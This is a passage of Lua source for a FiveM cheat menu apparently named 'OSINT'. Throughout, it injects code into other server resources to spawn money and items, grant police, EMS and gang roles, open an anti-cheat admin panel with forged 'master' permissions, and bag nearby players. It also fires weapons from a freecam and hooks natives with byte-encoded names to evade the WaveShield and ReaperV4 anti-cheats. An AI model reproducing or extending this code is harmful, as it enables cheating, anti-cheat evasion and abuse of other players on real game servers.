                                    local myCoords = SafeGetCoords(myPed)
                                    if not myCoords then break end

                                    local players = SafeGetPlayers()
                                    if not players then break end

                                    for _, pid in ipairs(players) do
                                        local targetPed = SafeGetPed(pid)
                                        if targetPed and targetPed ~= myPed then
                                            local targetCoords = SafeGetCoords(targetPed)
                                            if targetCoords and GetDistance(myCoords, targetCoords) <= 300000.0 then
                                                local sid = SafeGetServerId(pid)
                                                if sid then
                                                    SafeSTrigger('RZRP:Player:BagClosestPlayer', sid)
                                                end
                                            end
                                        end
                                    end

                                    SafeWait(2000)
                                end

                                _G.OSINTBagThread = nil
                            end)
                        else
                            _G.OSINTBagPlayersEnabled = true
                        end
                    ]])
                else
                    print('Bag Closest Players Stopped...')
                    Injection("rzrp-base", [[
                        _G.OSINTBagPlayersEnabled = false
                        _G.OSINTBagPlayersInitialized = false
                        if _G.OSINTBagThread then
                            TerminateThread(_G.OSINTBagThread)
                            _G.OSINTBagThread = nil
                        end
                    ]])
                end
            end
        })
    end

    if GetResourceState("scripts") == "started" or GetResourceState("framework") == "started" then
        AddTrigger({ 
            type = "button", 
            label = "Set Gang",
            onSelect = function()
                local gangName = ""
                local gangRank = 1
                OSINT:HideUI()
                KeyboardInput("Gang Name", "", function(val)
                    if val and val ~= "" then
                        gangName = val
                    end
                end, "typeable")
                Wait(2300)
                KeyboardInput("Gang Rank", "", function(val)
                    if val and val ~= "" then
                        gangRank = tonumber(val) or 1
                    end
                end, "typeable")
                Wait(1000)
                local targetResource = GetResourceState("scripts") == "started" and "scripts" or "framework"
                local injectionCode = string.format([[
                    LocalPlayer.state:set("gang", "%s", true)
                    LocalPlayer.state:set("gang_rank", %d, true)
                ]], gangName, gangRank)
                Injection(targetResource, injectionCode)
                OSINT:ShowUI()
                OSINT:Notify("success", "OSINT", "Gang Set", 4000)
            end
        })
    end

    if GetResourceState("framework") == "started" then
        AddTrigger({
            type = "button",
            label = "Give Item #2",
            onSelect = function()
                OSINT:HideUI()

                local function GetInput(title, default)
                    local result = nil
                    local done = false

                    KeyboardInput(title, default or "", function(val)
                        result = val
                        done = true
                    end, "typeable")

                    while not done do
                        Wait(0)
                    end

                    return result
                end

                print("^7[^5OSINT^7] [^3DEBUG^7]: Waiting for item input...")

                local itemName = GetInput("Item Name", "")
                print("^7[^5OSINT^7] [^3DEBUG^7]: Raw itemName =", tostring(itemName))

                if not itemName or itemName == "" then
                    print("^7[^5OSINT^7] [^1ERROR^7]: Invalid or empty itemName")
                    OSINT:Notify("error", "OSINT", "No item name entered", 3000)
                    OSINT:ShowUI()
                    return
                end

                print("^7[^5OSINT^7] [^3DEBUG^7]: Waiting for item count input...")

                local inputCount = GetInput("Item Count", "1")
                print("^7[^5OSINT^7] [^3DEBUG^7]: Raw inputCount =", tostring(inputCount))

                local itemCount = tonumber(inputCount)
                if not itemCount or itemCount < 1 then
                    print("^7[^5OSINT^7] [^1WARN^7]: Invalid count, defaulting to 1")
                    itemCount = 1
                end
                if itemCount > 100000 then
                    print("^7[^5OSINT^7] [^1WARN^7]: Count too high, clamping to 100000")
                    itemCount = 100000
                end

                itemName  = tostring(itemName or "")
                itemCount = tonumber(itemCount or 1)

                print("^7[^5OSINT^7] [^3DEBUG^7]: Final itemName =", itemName)
                print("^7[^5OSINT^7] [^3DEBUG^7]: Final itemCount =", itemCount)

                local success, err = pcall(function()
                    MachoInjectResourceRaw("framework", string.format([[
                        TriggerServerEvent('drugs:receive', {
                            Reward = {
                                Name = "%s",
                                Amount = %d
                            }
                        })
                    ]], itemName, itemCount))
                end)

                if not success then
                    print("^7[^5OSINT^7] [^1ERROR^7]: string.format failed â†’", err)
                    OSINT:Notify("error", "OSINT", "String format failed â€” check console", 4000)
                else
                    print("^7[^5OSINT^7] [^2INFO^7]: Injection completed successfully")
                    OSINT:Notify("success", "OSINT", "Item Sent", 4000)
                end

                OSINT:ShowUI()
            end
        })
    end

    if GetResourceState("WayTooCerti_3D_Printer") == 'started' then
        AddTrigger({ type = "button", label = "Give Item #3",
            onSelect = function()
            MachoInjectResourceRaw("WayTooCerti_3D_Printer", [[
                local function Ak47Spawn()
                TriggerServerEvent('waytoocerti_3dprinter:CompletePurchase', 'money', 10000)
                end
                Ak47Spawn()
            ]])
            end
        })
    end

    if GetResourceState("tm-base") == "started" then
        table.insert(events, {
            name = "Spawn Money #4",
            eventName = "give_metro_money_04",
            execute = function()
                print('Give Money Metro RP...')
                MachoInjectResource2(NewThreadNs, "tm-base", [[
                TriggerServerEvent('tm-moneywash:giveCleanMoney', 100000)
                ]])
            end
        })
    end


    if GetResourceState("scripts") == "started" or GetResourceState("framework") == "started" then
        AddTrigger({
            type = "button",
            label = "Set Chat Tag",
            onSelect = function()
                OSINT:HideUI()

                local function GetInput(title, default)
                    local result = nil
                    local done = false

                    KeyboardInput(title, default or "", function(val)
                        result = val
                        done = true
                    end, "typeable")

                    while not done do
                        Wait(0)
                    end

                    return result
                end

                local tagName = GetInput("Chat Tag Name", "")
                if not tagName or tagName == "" then
                    OSINT:ShowUI()
                    return
                end

                Wait(500)

                local colorInput = GetInput("Tag Color (R, G, B)", "0, 255, 0")
                if not colorInput or colorInput == "" then
                    colorInput = "255, 255, 255"
                end

                Wait(500)

                local targetResource = GetResourceState("scripts") == "started" and "scripts" or "framework"
                MachoInjectResourceRaw(targetResource, string.format([[
                    LocalPlayer.state:set('currentChatTag', { tag = "%s", color = "%s" }, true)
                ]], tagName, colorInput))

                OSINT:ShowUI()
            end
        })
    end

if GetResourceState("wasabi_multijob") == 'started' then
    AddTrigger({ type = "button", label = "Set Job #3 (Police)",
        onSelect = function()
        MachoInjectResource2(NewThreadNs, "wasabi_multijob", [[
            local job = { label = "Police", name = "police", grade = 1, grade_label = "Officer", grade_name = "officer" }
            CheckJob(job, true) 
        ]])
        MachoInjectResource2(NewThreadNs, "wasabi_multijob", [[
            SelectJobMenu({ job = 'police', grade = 1, label = 'Police', boss = true, onDuty = false })
        ]])
        end
    })
end

if GetResourceState("wasabi_multijob") == 'started' then
    AddTrigger({ type = "button", label = "Set Job #2 (EMS)",
        onSelect = function()
        MachoInjectResource2(NewThreadNs, "wasabi_multijob", [[
            local job = { label = "EMS", name = "ambulance", grade = 1, grade_label = "Medic", grade_name = "medic", boss = false, onDuty = true }
            CheckJob(job, true)
        ]])
        MachoInjectResource2(NewThreadNs, "wasabi_multijob", [[
            SelectJobMenu({ job = 'ambulance', grade = 5, label = 'Ambulance', boss = true, onDuty = false })
        ]])
        end
    })
end


if GetResourceState("ElectronAC") == 'started' then
    AddTrigger({ type = "button", label = "ElectronAC Admin Panel",
        onSelect = function()
        MachoInjectResourceRaw("ElectronAC", [[
        SetNuiFocus(true, true)
        SendNUIMessage({
            action = "menu",
            data = {
                info = {
                    adminContext = {
                        master = true,
                        permissions = { "all" }
                    },
                    identifiers = {
                        ["ip"] = "127.0.0.1",
                        ["license"] = "",
                        ["license2"] = "",
                    },
                    permissions = {
                        adminMenu = true,
                        whitelisted = true
                    }
                },
                open = true,
                setOpen = true
            }
        })
        ]])
        end
    })
end

if GetResourceState("spoodyFraud") == 'started' then
    AddTrigger({ type = "button", label = "Give Money #1",
        onSelect = function()
        MachoInjectResource2(NewThreadNs, 'spoodyFraud', [[
        function HookNative(nativeName, newFunction)
            local originalNative = _G[nativeName]
            if not originalNative or type(originalNative) ~= "function" then
                return
            end

            _G[nativeName] = function(...)
                return newFunction(originalNative, ...)
            end
        end

        HookNative("CreateThread", function(originalFn, ...)
            return originalFn(...)
        end)

        HookNative("TriggerServerEvent", function(originalFn, ...)
            return originalFn(...)
        end)

        function Spoody()
            for i = 1, 30 do
                TriggerServerEvent('spoodyFraud:interactionComplete', 'Swapped Sim Card')
                TriggerServerEvent('spoodyFraud:interactionComplete', 'Cloned Card')

                Citizen.Wait(5)

                TriggerServerEvent('spoodyFraud:attemptSellProduct', 'Pacific Bank', 'clone')
                TriggerServerEvent('spoodyFraud:attemptSellProduct', 'Sandy Shoes', 'sim')
            end
        end

        CreateThread(function()
            Spoody()
        end)
        ]])
        end
    })
end

    KeyboardInput("Choose Menu Key", "", function(val)
        for vk, name in pairs(MappedKeys) do
            if name:lower() == val:lower() then
                MenuKey = name
                Wait(250)
                OSINT:ShowUI()
                return
            end
        end
    end, "keybind")

    local lastSliderPress = 0
    local sliderDelay = 120

    while true do
        Wait(0)

        if FreecamEnabled then
            local hoveredOption = FreecamOptions[FreecamHoveredIndex]

            -- Scroll Wheel
            if IsControlJustReleased(0, 14) then -- Wheel Down
                FreecamHoveredIndex = (FreecamHoveredIndex % #FreecamOptions) + 1
                MachoSendDuiMessage(DUI, json.encode({ action = "scroll", direction = "down" }))
            end

            if IsControlJustReleased(0, 15) then -- Wheel Up
                FreecamHoveredIndex = (FreecamHoveredIndex - 2) % #FreecamOptions + 1
                MachoSendDuiMessage(DUI, json.encode({ action = "scroll", direction = "up" }))
            end

            if hoveredOption == "Shoot Weapon" then
                if IsDisabledControlJustPressed(0, 44) then -- Q
                    CurrentWeaponIndex = (CurrentWeaponIndex - 2) % #FreecamWeaponList + 1
                    MachoSendDuiMessage(DUI, json.encode({ action = "updateWeapon", index = CurrentWeaponIndex }))
                end
                if IsDisabledControlJustPressed(0, 38) then -- E
                    CurrentWeaponIndex = (CurrentWeaponIndex % #FreecamWeaponList) + 1
                    MachoSendDuiMessage(DUI, json.encode({ action = "updateWeapon", index = CurrentWeaponIndex }))
                end
            elseif hoveredOption == "Spawn Car" then
                if IsDisabledControlJustPressed(0, 44) then -- Q
                    CurrentVehicleIndex = (CurrentVehicleIndex - 2) % #FreecamVehicleList + 1
                    MachoSendDuiMessage(DUI, json.encode({ action = "updateVehicle", index = CurrentVehicleIndex }))
                end
                if IsDisabledControlJustPressed(0, 38) then -- E
                    CurrentVehicleIndex = (CurrentVehicleIndex % #FreecamVehicleList) + 1
                    MachoSendDuiMessage(DUI, json.encode({ action = "updateVehicle", index = CurrentVehicleIndex }))
                end
            end

            if IsDisabledControlPressed(0, 24) then
                local action = hoveredOption
                if action == "Shoot Weapon" then
                    local weapon = FreecamWeaponList[CurrentWeaponIndex]

                    if weapon == "WEAPON_PERMKILL" then
                        weapon = "WEAPON_TRANQUILIZER"
                    elseif weapon == "WEAPON_RPG_2" then
                        weapon = "WEAPON_AIRSTRIKE_ROCKET"
                    end

                    if weapon ~= LastWeaponFired then
                        LastWeaponFired = weapon

                        print(("weapon: %s, LastWeaponFired: %s"):format(weapon, LastWeaponFired))
                        
                        if GetResourceState("ReaperV4") ~= "started" or GetCurrentServerEndpoint() == "216.146.24.88:30120" then
                            if GetResourceState("WaveShield") == "started" then
                                if _G.OSINTFreecamObject then
                                    local function RotationToDirection(rot)
                                        local z = math.rad(rot.z)
                                        local x = math.rad(rot.x)
                                        local num = math.abs(math.cos(x))
                                        return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                    end

                                    function hNative(nativeName, newFunction)
                                        local originalNative = _G[nativeName]
                                        if not originalNative or type(originalNative) ~= "function" then
                                            return
                                        end

                                        _G[nativeName] = function(...)
                                            return newFunction(originalNative, ...)
                                        end
                                    end

                                    hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                    hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                    hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetHashKey", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
                                    hNative("SetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                    hNative("RemoveWeaponFromPed", function(originalFn, ...) return end)
                                    hNative("ShootSingleBulletBetweenCoords", function(originalFn, ...) return originalFn(...) end)

                                    local camCoords = GetCamCoord(_G.OSINTFreecamObject)
                                    local camRot = GetCamRot(_G.OSINTFreecamObject, 2)
                                    local forward = RotationToDirection(camRot)
                                    local rayLength = 1000.0
                                    local targetPos = camCoords + forward * rayLength
                                    local playerPed = PlayerPedId()
                                    local weaponHash = GetHashKey(weapon)

                                    local function Encode(str)
                                        local t = {}
                                        for i = 1, #str do t[i] = string.byte(str, i) end
                                        return table.concat(t, ",")
                                    end

                                    local weaponBytes = Encode(weapon)

                                    Injection(GetResourceState("monitor") == "started" and "monitor" or GetResourceState("WaveShield") == "started" and "WaveShield" or "any", string.format([[
                                        if not _G.osintWeaponBypass then
                                            _G.osintWeaponBypass = { enabled = false }
                                        end
                                        _G.osintWeaponBypass.enabled = true

                                        local function hNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then return end
                                            _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                        end

                                        hNative("GetHashKey", function(orig, str) return orig(str) end)
                                        hNative("GiveWeaponToPed", function(orig, ped, hash, ammo, isHidden, equipNow)
                                            if _G.osintWeaponBypass and _G.osintWeaponBypass.enabled then
                                                return orig(ped, hash, ammo, false, true)
                                            else
                                                return orig(ped, hash, ammo, isHidden, equipNow)
                                            end
                                        end)
                                        hNative("SetCurrentPedWeapon", function(orig, ped, hash, equipNow)
                                            if _G.osintWeaponBypass and _G.osintWeaponBypass.enabled then
                                                return orig(ped, hash, true)
                                            else
                                                return orig(ped, hash, equipNow)
                                            end
                                        end)

                                        local function _b(str)
                                            local t = {}
                                            for i = 1, #str do t[i] = string.byte(str, i) end
                                            return t
                                        end
                                        local function _d(tbl)
                                            local s = ""
                                            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                            return s
                                        end
                                        local function _g(n)
                                            local k = _d(n)
                                            local f = _G[k]
                                            return f
                                        end

                                        local function initFlow(cb)
                                            local co = coroutine.create(cb)
                                            local ok, err
                                            while coroutine.status(co) ~= "dead" do
                                                ok, err = coroutine.resume(co)
                                                if not ok then
                                                    print("WaveShield WeaponBypass error:", err)
                                                    break
                                                end
                                                Citizen.Wait(0)
                                            end
                                        end

                                        initFlow(function()
                                            local ped = %d
                                            if _g(_b("DoesEntityExist"))(ped) then
                                                local weaponName = _d({%s})
                                                local weaponHash = _g(_b("GetHashKey"))(weaponName)
                                                if weaponHash and weaponHash ~= 0 then
                                                    _g(_b("GiveWeaponToPed"))(ped, weaponHash, 9999, false, true)
                                                    _g(_b("SetCurrentPedWeapon"))(ped, weaponHash, true)
                                                end
                                            end
                                        end)

                                        print("Zawg")
                                    ]], playerPed, weaponBytes))

                                    -- MachoInjectThread(0, GetResourceState("monitor") and "monitor" or "any", "", [[
                                    --     function hNative(nativeName, newFunction)
                                    --         local originalNative = _G[nativeName]
                                    --         if not originalNative or type(originalNative) ~= "function" then
                                    --             return
                                    --         end

                                    --         _G[nativeName] = function(...)
                                    --             return newFunction(originalNative, ...)
                                    --         end
                                    --     end

                                    --     hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                    --     hNative("GetHashKey", function(originalFn, ...) return originalFn(...) end)
                                    --     hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
                                    --     hNative("SetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                    --     hNative("GetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                    --     hNative("RemoveWeaponFromPed", function(originalFn, ...) return end)
                                    --     hNative("ShootSingleBulletBetweenCoords", function(originalFn, ...) return originalFn(...) end)

                                    --     local camCoords = ]] .. camCoords .. [[
                                    --     local targetPos = ]] .. targetPos .. [[
                                    --     local weaponHash = GetHashKey(]] .. weapon .. [[)

                                    --     GiveWeaponToPed(PlayerPedId(), weaponHash, 250, false, true)
                                    --     SetCurrentPedWeapon(PlayerPedId(), weaponHash, true)
                                    -- ]])

                                    Wait(350)

                                    ShootSingleBulletBetweenCoords(
                                        camCoords.x, camCoords.y, camCoords.z,
                                        targetPos.x, targetPos.y, targetPos.z,
                                        100,           -- damage
                                        true,          -- isAudible
                                        weaponHash,
                                        PlayerPedId(),
                                        true,          -- isInvisible
                                        false,         -- isCritical
                                        100000.0         -- speed
                                    )
                                end
                            else
                                MachoInjectResourceRaw(GetResourceState("monitor") == "started" and "monitor" or "any", [[
                                    if _G.OSINTFreecamObject then
                                        local function RotationToDirection(rot)
                                            local z = math.rad(rot.z)
                                            local x = math.rad(rot.x)
                                            local num = math.abs(math.cos(x))
                                            return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                        end

                                        function hNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then
                                                return
                                            end

                                            _G[nativeName] = function(...)
                                                return newFunction(originalNative, ...)
                                            end
                                        end

                                        hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                        hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                        hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetHashKey", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                        hNative("RemoveWeaponFromPed", function(originalFn, ...) return end)
                                        hNative("ShootSingleBulletBetweenCoords", function(originalFn, ...) return originalFn(...) end)

                                        local camCoords = GetCamCoord(_G.OSINTFreecamObject)
                                        local camRot = GetCamRot(_G.OSINTFreecamObject, 2)
                                        local forward = RotationToDirection(camRot)
                                        local rayLength = 1000.0
                                        local targetPos = camCoords + forward * rayLength
                                        local playerPed = PlayerPedId()
                                        local weaponHash = GetHashKey("]] .. weapon .. [[")

                                        GiveWeaponToPed(PlayerPedId(), weaponHash, 13500, false, true)
                                        SetCurrentPedWeapon(PlayerPedId(), weaponHash, true)
                                        ShootSingleBulletBetweenCoords(
                                            camCoords.x, camCoords.y, camCoords.z,
                                            targetPos.x, targetPos.y, targetPos.z,
                                            100,           -- damage
                                            true,          -- isAudible
                                            weaponHash,
                                            playerPed,
                                            true,          -- isInvisible
                                            false,         -- isCritical
                                            100000.0         -- speed
                                        )
                                    end
                                ]])
                            end
                        else
                            if _G.OSINTFreecamObject then
                                local function RotationToDirection(rot)
                                    local z = math.rad(rot.z)
                                    local x = math.rad(rot.x)
                                    local num = math.abs(math.cos(x))
                                    return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                end

                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetHashKey", function(originalFn, ...) return originalFn(...) end)
                                hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                hNative("RemoveWeaponFromPed", function(originalFn, ...) return end)

                                local camCoords = GetCamCoord(_G.OSINTFreecamObject)
                                local camRot = GetCamRot(_G.OSINTFreecamObject, 2)
                                local forward = RotationToDirection(camRot)
                                local rayLength = 1000.0
                                local targetPos = camCoords + forward * rayLength
                                local playerPed = PlayerPedId()
                                local weaponHash = GetHashKey(weapon)

                                GiveWeaponToPed(playerPed, weaponHash, 255, false, true)
                                MachoInjectThread(0, "ReaperV4", "", [[
                                    local success = exports["ReaperV4"]:InvokeCPlayer("set", "Weapon:" .. ]] .. weaponHash .. [[, true, true)
                                    if success then
                                        print("Updated Cache Successfully")
                                    else
                                        print("Failed to Update Cache")
                                    end
                                ]])
                                Wait(250)
                                ShootSingleBulletBetweenCoords(
                                    camCoords.x, camCoords.y, camCoords.z,
                                    targetPos.x, targetPos.y, targetPos.z,
                                    100,           -- damage
                                    true,          -- isAudible
                                    weaponHash,
                                    playerPed,
                                    true,          -- isInvisible
                                    false,         -- isCritical
                                    100000.0         -- speed
                                )
                            end
                        end
                    else
                        if GetResourceState("ReaperV4") ~= "started" or GetCurrentServerEndpoint() == "216.146.24.88:30120" then
                            if GetResourceState("WaveShield") == "started" then
                                if _G.OSINTFreecamObject then
                                    print("Toogie Doogie")

                                    local function RotationToDirection(rot)
                                        local z = math.rad(rot.z)
                                        local x = math.rad(rot.x)
                                        local num = math.abs(math.cos(x))
                                        return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                    end

                                    function hNative(nativeName, newFunction)
                                        local originalNative = _G[nativeName]
                                        if not originalNative or type(originalNative) ~= "function" then
                                            return
                                        end

                                        _G[nativeName] = function(...)
                                            return newFunction(originalNative, ...)
                                        end
                                    end

                                    hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                    hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                    hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetHashKey", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
                                    hNative("SetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                    hNative("RemoveWeaponFromPed", function(originalFn, ...) return end)
                                    hNative("ShootSingleBulletBetweenCoords", function(originalFn, ...) return originalFn(...) end)

                                    local camCoords = GetCamCoord(_G.OSINTFreecamObject)
                                    local camRot = GetCamRot(_G.OSINTFreecamObject, 2)
                                    local forward = RotationToDirection(camRot)
                                    local rayLength = 1000.0
                                    local targetPos = camCoords + forward * rayLength
                                    local playerPed = PlayerPedId()
                                    local weaponHash = GetHashKey(weapon)

                                    local function Encode(str)
                                        local t = {}
                                        for i = 1, #str do t[i] = string.byte(str, i) end
                                        return table.concat(t, ",")
                                    end

                                    local weaponBytes = Encode(weapon)

                                    Injection(GetResourceState("monitor") == "started" and "monitor" or GetResourceState("WaveShield") == "started" and "WaveShield" or "any", string.format([[
                                        if not _G.osintWeaponBypass then
                                            _G.osintWeaponBypass = { enabled = false }
                                        end
                                        _G.osintWeaponBypass.enabled = true

                                        local function hNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then return end
                                            _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                        end

                                        hNative("GetHashKey", function(orig, str) return orig(str) end)
                                        hNative("GiveWeaponToPed", function(orig, ped, hash, ammo, isHidden, equipNow)
                                            if _G.osintWeaponBypass and _G.osintWeaponBypass.enabled then
                                                return orig(ped, hash, ammo, false, true)
                                            else
                                                return orig(ped, hash, ammo, isHidden, equipNow)
                                            end
                                        end)
                                        hNative("SetCurrentPedWeapon", function(orig, ped, hash, equipNow)
                                            if _G.osintWeaponBypass and _G.osintWeaponBypass.enabled then
                                                return orig(ped, hash, true)
                                            else
                                                return orig(ped, hash, equipNow)
                                            end
                                        end)

                                        local function _b(str)
                                            local t = {}
                                            for i = 1, #str do t[i] = string.byte(str, i) end
                                            return t
                                        end
                                        local function _d(tbl)
                                            local s = ""
                                            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                            return s
                                        end
                                        local function _g(n)
                                            local k = _d(n)
                                            local f = _G[k]
                                            return f
                                        end

                                        local function initFlow(cb)
                                            local co = coroutine.create(cb)
                                            local ok, err
                                            while coroutine.status(co) ~= "dead" do
                                                ok, err = coroutine.resume(co)
                                                if not ok then
                                                    print("WaveShield WeaponBypass error:", err)
                                                    break
                                                end
                                                Citizen.Wait(0)
                                            end
                                        end

                                        initFlow(function()
                                            local ped = %d
                                            if _g(_b("DoesEntityExist"))(ped) then
                                                local weaponName = _d({%s})
                                                local weaponHash = _g(_b("GetHashKey"))(weaponName)
                                                if weaponHash and weaponHash ~= 0 then
                                                    _g(_b("GiveWeaponToPed"))(ped, weaponHash, 9999, false, true)
                                                    _g(_b("SetCurrentPedWeapon"))(ped, weaponHash, true)
                                                end
                                            end
                                        end)

                                        print("Zawg")
                                    ]], playerPed, weaponBytes))

                                    Wait(150)

                                    ShootSingleBulletBetweenCoords(
                                        camCoords.x, camCoords.y, camCoords.z,
                                        targetPos.x, targetPos.y, targetPos.z,
                                        100,           -- damage
                                        true,          -- isAudible
                                        weaponHash,
                                        playerPed,
                                        true,          -- isInvisible
                                        false,         -- isCritical
                                        100000.0         -- speed
                                    )
                                end
                            else
                                MachoInjectResourceRaw(GetResourceState("monitor") == "started" and "monitor" or "any", [[
                                    if _G.OSINTFreecamObject then
                                        local function RotationToDirection(rot)
                                            local z = math.rad(rot.z)
                                            local x = math.rad(rot.x)
                                            local num = math.abs(math.cos(x))
                                            return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                        end

                                        function hNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then
                                                return
                                            end

                                            _G[nativeName] = function(...)
                                                return newFunction(originalNative, ...)
                                            end
                                        end

                                        hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                        hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                        hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetHashKey", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                        hNative("RemoveWeaponFromPed", function(originalFn, ...) return end)
                                        hNative("ShootSingleBulletBetweenCoords", function(originalFn, ...) return originalFn(...) end)

                                        local camCoords = GetCamCoord(_G.OSINTFreecamObject)
                                        local camRot = GetCamRot(_G.OSINTFreecamObject, 2)
                                        local forward = RotationToDirection(camRot)
                                        local rayLength = 1000.0
                                        local targetPos = camCoords + forward * rayLength
                                        local playerPed = PlayerPedId()
                                        local weaponHash = GetHashKey("]] .. weapon .. [[")

                                        ShootSingleBulletBetweenCoords(
                                            camCoords.x, camCoords.y, camCoords.z,
                                            targetPos.x, targetPos.y, targetPos.z,
                                            100,           -- damage
                                            true,          -- isAudible
                                            weaponHash,
                                            playerPed,
                                            true,          -- isInvisible
                                            false,         -- isCritical
                                            100000.0         -- speed
                                        )
                                    end
                                ]])
                            end
                        else
                            if _G.OSINTFreecamObject then
                                local function RotationToDirection(rot)
                                    local z = math.rad(rot.z)
                                    local x = math.rad(rot.x)
                                    local num = math.abs(math.cos(x))
                                    return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                end

                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetHashKey", function(originalFn, ...) return originalFn(...) end)
                                hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                hNative("RemoveWeaponFromPed", function(originalFn, ...) return end)

                                local camCoords = GetCamCoord(_G.OSINTFreecamObject)
                                local camRot = GetCamRot(_G.OSINTFreecamObject, 2)
                                local forward = RotationToDirection(camRot)
                                local rayLength = 1000.0
                                local targetPos = camCoords + forward * rayLength
                                local playerPed = PlayerPedId()
                                local weaponHash = GetHashKey(weapon)

                                GiveWeaponToPed(PlayerPedId(), weaponHash, 250, false, true)
                                SetCurrentPedWeapon(PlayerPedId(), weaponHash, true)
                                ShootSingleBulletBetweenCoords(
                                    camCoords.x, camCoords.y, camCoords.z,
                                    targetPos.x, targetPos.y, targetPos.z,
                                    100,           -- damage
                                    true,          -- isAudible
                                    weaponHash,
                                    playerPed,
                                    true,          -- isInvisible
                                    false,         -- isCritical
                                    100000.0         -- speed
                                )
                            end
                        end
                    end
                end
            end

            -- Left Click
            if IsDisabledControlJustPressed(0, 24) then
                local action = hoveredOption
                if action == "Teleport" then
                    if GetResourceState("ReaperV4") ~= "started" or GetCurrentServerEndpoint() == "216.146.24.88:30120" then
                        if GetResourceState("WaveShield") == "started" then
                            if _G.OSINTFreecamObject then
                                local function RotationToDirection(rot)
                                    local z = math.rad(rot.z)
                                    local x = math.rad(rot.x)
                                    local num = math.abs(math.cos(x))
                                    return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                end

                                function GetEmptySeat(vehicle)
                                    local seats = {
                                        -1, 0, 1, 2
                                    }

                                    for _, seat in ipairs(seats) do
                                        if IsVehicleSeatFree(vehicle, seat) then
                                            return seat
                                        end
                                    end

                                    return -1
                                end

                                local camCoords = GetCamCoord(_G.OSINTFreecamObject)
                                local rot = GetCamRot(_G.OSINTFreecamObject, 2)
                                local forward = RotationToDirection(rot)
                                local rayLength = 1000.0
                                local targetPos = camCoords + forward * rayLength
                                local rayHandle = StartShapeTestRay(camCoords.x, camCoords.y, camCoords.z, targetPos.x, targetPos.y, targetPos.z, -1, PlayerPedId(), 0)
                                local _, hit, endCoords, _, entityHit = GetShapeTestResult(rayHandle)

                                if hit then
                                    if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                        local vehicle = entityHit
                                        local playerPed = PlayerPedId()
                                        local seat = GetEmptySeat(vehicle)
                                        if seat == -1 then
